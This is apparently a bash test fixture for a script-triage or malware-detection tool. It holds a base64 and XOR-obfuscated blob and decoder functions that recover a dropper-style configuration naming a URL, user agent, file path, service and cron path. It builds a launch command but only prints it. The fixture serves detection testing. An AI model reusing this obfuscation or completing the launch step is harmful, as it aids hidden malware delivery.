# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_7e0c8c74='+iJ21Kf4ejfb6eBwJMmg6UArx7ftc2vMvf9vJty35EA32rvvejTbqO17Jtig6W16yrX/dxjbt/52N9yo/2smz7HTfCjduvgidtS37XI3yb3rcRjBsLF8JsWk7XYgxvnpKyaf4ep6dJzi8HkuxLHTbybcvLEwM8Wko3cyxqD+ejTb+e9+JMCxozE03LXremrN4O0ocs6xvytx'
readonly Codec_7e0c8c74='base64_literal|repeating_key_xor|8c,1f,47,a8,d4'

Load_7e0c8c74() {
  item1=()
  local item6
  while read -r item6; do [[ -n "$item6" ]] && item1+=("$item6"); done < <(printf '%s' "${Material_7e0c8c74}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_7e0c8c74() {
  item2=()
  local -a key_bytes=(140 31 71 168 212)
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$((item1[item5] ^ key_bytes[item5 % ${#key_bytes[@]}]))")
  done
}

Recover_7e0c8c74() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a series=(3 5 8 13); item4="${series[*]:1:2}"
  Load_7e0c8c74
  Decode_7e0c8c74
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_7e0c8c74() { local recovered field; local -a fields; recovered="$(Recover_7e0c8c74)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_7e0c8c74() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_7e0c8c74)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a launch_command=(bash "$file_path")
  declare -p launch_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_7e0c8c74; fi

# reconstruction complete